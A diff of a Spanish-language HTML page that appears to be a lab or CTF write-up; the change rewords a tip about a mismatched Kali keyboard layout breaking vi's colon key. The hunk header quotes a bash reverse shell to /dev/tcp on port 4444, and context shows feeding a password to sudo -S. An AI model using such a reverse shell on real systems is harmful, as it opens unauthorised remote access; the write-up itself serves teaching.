@@ -372,7 +372,7 @@ bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.14.33/4444 0&gt;&amp;1'</pre>
     <p class="f">Si <code class="ic">sudo</code> se queja de <code class="ic">a terminal is required to read the password</code>, puedes pasarle la contraseña por la entrada estándar con <code class="ic">-S</code> (aunque para un comando interactivo como vi igual necesitarás TTY):</p>
     <pre><span class="k">echo</span> 'P@s5w0rd!' | <span class="k">sudo</span> -S -l</pre>
 
-    <div class="warn"><b>EL BUG MÁS TONTO Y REAL: EL TECLADO</b>Dentro de vi, escribir <span class="mono">:</span> no hacía nada. La causa no era técnica: el <b>layout del teclado</b> de Kali no coincidía con el teclado físico, así que la tecla de los dos puntos producía otro carácter. Se diagnostica probando teclas o se arregla de raíz con <span class="mono">setxkbmap latam</span> (o <span class="mono">es</span>). Cuando algo "imposible" pasa, sospecha también de lo tonto.</div>
+    <div class="warn"><b>EL BUG MÁS TONTO Y REAL: EL TECLADO</b>Dentro de vi, la tecla que abre los comandos del editor (la de los dos puntos) no producía nada al pulsarla. La causa no era técnica: el layout del teclado de Kali no coincidía con el teclado físico, así que esa tecla escribía otro carácter. Se diagnostica probando teclas o se arregla de raíz con <span class="mono">setxkbmap latam</span> (o <span class="mono">es</span>). Cuando algo "imposible" pasa, sospecha también de lo tonto.</div>
   </div>
 </section>
 
